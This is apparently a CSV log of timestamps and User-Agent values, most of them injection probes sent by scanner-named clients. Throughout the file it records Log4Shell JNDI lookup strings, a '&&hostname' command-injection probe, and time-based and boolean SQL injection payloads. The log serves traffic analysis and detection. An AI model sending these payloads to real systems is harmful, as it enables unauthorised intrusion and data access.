Time,User Agent
"2026-06-09 11:58:32","*BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsTDAV6gBAIAAKAA="
"2026-06-09 11:55:09","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8KAAAAAAAAAAAA="
"2026-06-09 11:51:31","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8KAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8KAAAAAAAAAAAA="
"2026-06-09 11:46:30","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8KAAAAAAAAAAAA="
"2026-06-09 11:43:53","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8KAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8KAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8KAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8KAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8KAAAAAAAAAAAA="
"2026-06-09 11:38:54","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8KAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8KAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8KAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8KAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8KAAAAAAAAAAAA="
"2026-06-03 18:24:25","AssetProfiler/6.5 @@@@@@@"
"2026-06-02 00:30:21","WebEnumerationFramework/11.0 @@@@@@@"
"2026-06-01 15:32:25","%%%%%%%"
"2026-06-01 10:44:53","${jndi:rmi://127.0.0.1/exploit}"
"2026-06-01 10:44:44","&&hostname"
"2026-06-01 08:54:26","%%%%%%%"
"2026-06-01 01:19:30","VulnerabilitySweep/2.6 @@@@@@@"
"2026-05-31 22:15:50","${jndi:rmi://127.0.0.1/exploit}"
"2026-05-31 19:41:29","&&hostname"
"2026-05-31 17:05:07","${jndi:dns://127.0.0.1/x}"
"2026-05-31 15:50:00","${jndi:dns://127.0.0.1/x}"
"2026-05-30 12:26:37","&&hostname"
"2026-05-30 11:32:35","&&hostname"
"2026-05-30 11:29:39","&&hostname"
"2026-05-30 11:29:20","SecurityAssessmentClient/3.1 @@@@@@@"
"2026-05-30 11:25:28","TelemetryCollector/9.7 @@@@@@@"
"2026-05-29 17:20:18","&&hostname"
"2026-06-14 14:04:45","WebEnumerationFramework/11.0 @@@@@@@"
"2026-06-12 23:38:27","ThreatHunterAgent/8.2 @@@@@@@"
"2026-06-12 22:09:44","InternalAuditScanner/4.0 @@@@@@@"
"2026-06-12 22:09:43","ReconEngine/5.4 @@@@@@@"
"2026-06-12 16:25:08","ReconEngine/5.4 @@@@@@@"
"2026-06-03 22:16:57","DiscoveryProbe/7.3 @@@@@@@"
"2026-06-03 01:06:30","ReconEngine/5.4 @@@@@@@"
"2026-06-02 23:34:33","(select convert(int,char(65)))"
"2026-06-01 10:44:44","SecurityAssessmentClient/3.1 @@@@@@@"
"2026-06-01 01:19:13","%%%%%%%"
"2026-05-31 19:41:21","(select convert(int,char(65)))"
"2026-05-31 11:20:52","ThreatHunterAgent/8.2 @@@@@@@"
"2026-05-30 11:30:07","%%%%%%%"
"2026-06-13 11:36:22","VulnerabilitySweep/2.6 waitfor delay '0:0:9'"
"2026-06-12 16:25:07","VulnerabilitySweep/2.6 waitfor delay '0:0:5'"
"2026-06-02 00:30:21","TelemetryCollector/9.7 waitfor delay '0:0:5'"
"2026-06-01 16:00:12","&&hostname"
"2026-06-01 15:32:22","DiscoveryProbe/7.3 waitfor delay '0:0:9'"
"2026-06-01 15:31:40","TelemetryCollector/9.7 waitfor delay '0:0:9'"
"2026-06-01 08:54:26","12345\""\""\""};]*"
"2026-05-31 17:05:36","&&hostname"
"2026-05-31 14:50:25","12345\""\""\""};]*"
"2026-05-31 11:20:39","12345\""\""\""};]*"
"2026-05-30 11:30:53","12345\""\""\""};]*"
"2026-05-30 00:53:59","*BcfBAAAAA-CAAEFBAAQ8d72VnovG2cDuEHJTDt8i5TQSRSAAV6gBAIAAKAA=, *BcfBAAAAA-CAAEFBAAQ8d72VnovG2cDuEHJTDt8i5TQSRSAAV6gBAIAAKAA=, *BcfBAAAAA-CAAEFBAAQ8d72VnovG2cDuEHJTDt8i5TQSRSAAV6gBAIAAKAA=, *BcfBAAAAA-CAAEFBAAQ8d72VnovG2cDuEHJTDt8i5TQSRSAAV6gBAIAAKAA=, *BcfBAAAAA-CAAEFBAAQ8d72VnovG2cDuEHJTDt8i5TQSRSAAV6gBAIAAKAA="
"2026-06-12 22:09:43","VulnerabilitySweep/2.6 <<<<>>>>"
"2026-06-12 16:25:08","DiscoveryProbe/7.3 <<<<>>>>"
"2026-06-12 16:25:08","TelemetryCollector/9.7 <<<<>>>>"
"2026-06-04 18:37:27","SecurityAssessmentClient/3.1 waitfor delay '0:0:9'"
"2026-06-03 18:29:06","DiscoveryProbe/7.3 <<<<>>>>"
"2026-06-03 01:06:29","TelemetryCollector/9.7 select pg_sleep(3)"
"2026-06-03 01:06:00","12345\""\""\""};]*"
"2026-06-02 00:30:18","VulnerabilitySweep/2.6 <<<<>>>>"
"2026-06-01 08:54:24","SecurityAssessmentClient/3.1 waitfor delay '0:0:5'"
"2026-06-01 08:53:40","VulnerabilitySweep/2.6 waitfor delay '0:0:5'"
"2026-05-31 19:41:26","12345\""\""\""};]*"
"2026-05-31 17:05:14","%%%%%%%"
"2026-05-29 18:05:31","12345\""\""\""};]*"
"2026-06-12 23:38:27","DiscoveryProbe/7.3 waitfor delay '0:0:5'"
"2026-06-12 16:25:08","InternalAuditScanner/4.0 waitfor delay '0:0:5'"
"2026-06-12 16:25:08","VulnerabilitySweep/2.6 select pg_sleep(3)"
"2026-06-12 16:25:08","DiscoveryProbe/7.3 select pg_sleep(3)"
"2026-06-12 16:25:07","SecurityAssessmentClient/3.1 <<<<>>>>"
"2026-06-12 16:25:07","InternalAuditScanner/4.0 waitfor delay '0:0:9'"
"2026-06-12 16:25:07","WebEnumerationFramework/11.0 waitfor delay '0:0:5'"
"2026-06-04 18:37:27","VulnerabilitySweep/2.6 select pg_sleep(3)"
"2026-06-03 01:03:09","InternalAuditScanner/4.0 waitfor delay '0:0:9'"
"2026-06-02 23:37:28","WebEnumerationFramework/11.0 waitfor delay '0:0:5'"
"2026-06-01 10:44:56","(select convert(int,char(65)))"
"2026-06-01 08:54:47","SecurityAssessmentClient/3.1 <<<<>>>>"
"2026-06-01 01:19:26","ThreatHunterAgent/8.2 waitfor delay '0:0:9'"
"2026-05-31 17:05:00","NetworkSurveyBot/3.9 @@@@@@@"
"2026-06-13 10:46:02","NetworkSurveyBot/3.9 waitfor delay '0:0:5'"
"2026-06-12 23:38:27","DiscoveryProbe/7.3 select pg_sleep(3)"
"2026-06-12 22:09:44","DiscoveryProbe/7.3 <<<<>>>>"
"2026-06-12 20:19:43","ThreatHunterAgent/8.2 waitfor delay '0:0:5'"
"2026-06-12 18:14:28","SecurityAssessmentClient/3.1 waitfor delay '0:0:5'"
"2026-06-12 18:14:27","ThreatHunterAgent/8.2 <<<<>>>>"
"2026-06-12 16:25:08","ThreatHunterAgent/8.2 <<<<>>>>"
"2026-06-12 16:25:08","SecurityAssessmentClient/3.1 select pg_sleep(3)"
"2026-06-12 16:25:07","NetworkSurveyBot/3.9 waitfor delay '0:0:9'"
"2026-06-09 13:42:10","*BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivs_IAV6gBAIAAKAA="
"2026-06-09 13:36:25","*BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivs_IAV6gBAIAAKAA="
"2026-06-09 13:30:12","*BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivs_IAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivs_IAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivs_IAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivs_IAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivs_IAV6gBAIAAKAA="
"2026-06-09 13:27:46","*BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivs_IAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivs_IAV6gBAIAAKAA="
"2026-06-03 19:58:13","TelemetryCollector/9.7 select pg_sleep(6)"
"2026-06-03 19:53:22","ReconEngine/5.4 waitfor delay '0:0:9'"
"2026-06-03 01:06:31","NetworkSurveyBot/3.9 waitfor delay '0:0:9'"
"2026-06-03 01:02:17","InternalAuditScanner/4.0 waitfor delay '0:0:5'"
"2026-06-02 22:35:47","SecurityAssessmentClient/3.1 waitfor delay '0:0:5'"
"2026-06-01 15:32:25","AssetProfiler/6.5 waitfor delay '0:0:5'"
"2026-05-31 22:15:58","12345\""\""\""};]*"
"2026-05-30 11:32:23","DiscoveryProbe/7.3 <<<<>>>>"
"2026-05-30 11:30:51","SecurityAssessmentClient/3.1 select pg_sleep(3)"
"2026-05-30 11:29:31","DiscoveryProbe/7.3 <<<<>>>>"
"2026-06-13 11:36:22","DiscoveryProbe/7.3 select pg_sleep(6)"
"2026-06-13 10:46:03","NetworkSurveyBot/3.9 <<<<>>>>"
"2026-06-12 20:19:43","SecurityAssessmentClient/3.1 <<<<>>>>"
"2026-06-12 20:19:43","WebEnumerationFramework/11.0 <<<<>>>>"
"2026-06-12 16:25:08","DiscoveryProbe/7.3 select pg_sleep(6)"
"2026-06-12 16:25:07","WebEnumerationFramework/11.0 <<<<>>>>"
"2026-06-12 16:25:07","AssetProfiler/6.5 <<<<>>>>"
"2026-06-12 16:25:07","InternalAuditScanner/4.0 <<<<>>>>"
"2026-06-03 10:46:32","AssetProfiler/6.5 <<<<>>>>"
"2026-06-01 08:53:45","TelemetryCollector/9.7 select pg_sleep(6)"
"2026-05-31 14:50:32","WebEnumerationFramework/11.0 waitfor delay '0:0:5'"
"2026-06-12 23:38:28","ThreatHunterAgent/8.2 select pg_sleep(3)"
"2026-06-12 20:19:43","VulnerabilitySweep/2.6 select pg_sleep(6)"
"2026-06-12 18:14:28","DiscoveryProbe/7.3 select pg_sleep(6)"
"2026-06-12 18:14:28","ReconEngine/5.4 waitfor delay '0:0:9'"
"2026-06-03 19:53:44","VulnerabilitySweep/2.6 select pg_sleep(6)"
"2026-06-03 19:53:32","ReconEngine/5.4 waitfor delay '0:0:5'"
"2026-06-03 10:46:49","DiscoveryProbe/7.3 select pg_sleep(6)"
"2026-06-03 10:46:39","NetworkSurveyBot/3.9 <<<<>>>>"
"2026-06-01 15:31:42","WebEnumerationFramework/11.0 <<<<>>>>"
"2026-06-01 08:54:27","InternalAuditScanner/4.0 select pg_sleep(3)"
"2026-05-31 14:50:37","WebEnumerationFramework/11.0 <<<<>>>>"
"2026-05-31 11:20:42","NetworkSurveyBot/3.9 <<<<>>>>"
"2026-05-30 11:25:21","ThreatHunterAgent/8.2 select pg_sleep(3)"
"2026-05-29 17:20:55","NetworkSurveyBot/3.9 <<<<>>>>"
"2026-06-14 14:04:46","AssetProfiler/6.5 <<<<>>>>"
"2026-06-13 11:36:21","NetworkSurveyBot/3.9 select pg_sleep(3)"
"2026-06-12 22:09:44","WebEnumerationFramework/11.0 select pg_sleep(3)"
"2026-06-12 20:19:43","AssetProfiler/6.5 <<<<>>>>"
"2026-06-12 18:14:28","InternalAuditScanner/4.0 select pg_sleep(3)"
"2026-06-12 16:25:07","AssetProfiler/6.5 select pg_sleep(3)"
"2026-06-03 19:58:57","NetworkSurveyBot/3.9 select pg_sleep(3)"
"2026-06-03 19:53:20","ReconEngine/5.4 <<<<>>>>"
"2026-06-01 10:44:53","TelemetryCollector/9.7 select pg_sleep(6)"
"2026-05-31 14:50:24","AssetProfiler/6.5 select pg_sleep(3)"
"2026-05-30 11:30:52","NetworkSurveyBot/3.9 select pg_sleep(3)"
"2026-06-12 16:25:07","TelemetryCollector/9.7 ' OR 1=1--"
"2026-05-31 17:05:27","ReconEngine/5.4 select pg_sleep(3)"
"2026-05-29 18:05:35","ReconEngine/5.4 <<<<>>>>"
"2026-06-12 16:25:07","InternalAuditScanner/4.0 select pg_sleep(6)"
"2026-06-03 10:46:32","WebEnumerationFramework/11.0 select pg_sleep(6)"
"2026-06-02 00:30:24","InternalAuditScanner/4.0 select pg_sleep(6)"
"2026-06-01 10:44:55","InternalAuditScanner/4.0 select pg_sleep(3)"
"2026-05-31 17:05:26","InternalAuditScanner/4.0 select pg_sleep(6)"
"2026-05-31 15:50:00","NetworkSurveyBot/3.9 <<<<>>>>"
"2026-06-12 16:25:07","VulnerabilitySweep/2.6 ' OR 1=1--"
"2026-06-12 18:14:27","NetworkSurveyBot/3.9 select pg_sleep(6)"
"2026-06-12 16:25:07","NetworkSurveyBot/3.9 select pg_sleep(6)"
"2026-06-02 00:30:23","NetworkSurveyBot/3.9 select pg_sleep(6)"
"2026-05-31 14:50:25","DiscoveryProbe/7.3 ' OR 1=1--"
"2026-06-12 16:25:07","ReconEngine/5.4 select pg_sleep(6)"
"2026-06-01 15:31:42","AssetProfiler/6.5 select pg_sleep(6)"
"2026-05-30 11:29:26","ReconEngine/5.4 select pg_sleep(6)"
"2026-06-20 06:46:01","""-"""
"2026-06-09 08:54:42","""-"""
"2026-05-30 00:24:01","""-"""
"2026-05-30 00:18:29","""-"""
"2026-05-30 00:10:55","""-"""
"2026-05-30 00:06:13","""-"""
"2026-05-30 00:02:34","""-"""
"2026-05-29 23:58:00","""-"""
"2026-05-29 23:47:13","""-"""
"2026-05-29 22:58:24","""-"""
"2026-05-29 22:53:42","""-"""
"2026-05-29 22:48:36","""-"""
